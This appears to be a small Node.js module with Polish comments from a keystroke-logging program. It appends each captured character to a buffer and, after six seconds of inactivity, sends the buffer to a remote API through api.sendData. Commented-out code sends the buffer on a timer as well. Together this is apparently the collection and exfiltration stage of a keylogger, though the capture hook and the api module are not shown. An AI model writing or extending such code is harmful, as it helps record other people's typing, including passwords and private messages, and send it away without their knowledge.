const api = require('./api');
let logMessage = '';
let timer = null;

//TAK WIEM, odzielny plik do timeouta, ale na razie mi sie nie chce bawic w exporty, wersja alpha to jest

//Timeout do wyslania wiadomosci
function startTimeout() {
    //Jezeli timer jest aktywny, wyczysc
    if(timer) {
        clearTimeout(timer);
    }

    //Ustawia do zmiennej timer timeouta
    timer = setTimeout(() => {
        console.log('Wyslano');
        api.sendData(logMessage) //Wysyla dane
        logMessage = "";
    }, 6000);
//    300000
}

function addToLogMessage(char){
    logMessage += char;
    startTimeout(); //Co kazdy klik bedzie wywolywana metoda
}



//Wysylanie log'a do api co 20 minut
// setInterval(() => {
//     api.sendData(logMessage)
// }, 10000)
// setTimeout(() => api.sendData(logMessage), 10000);


module.exports.addToLogMessage = addToLogMessage;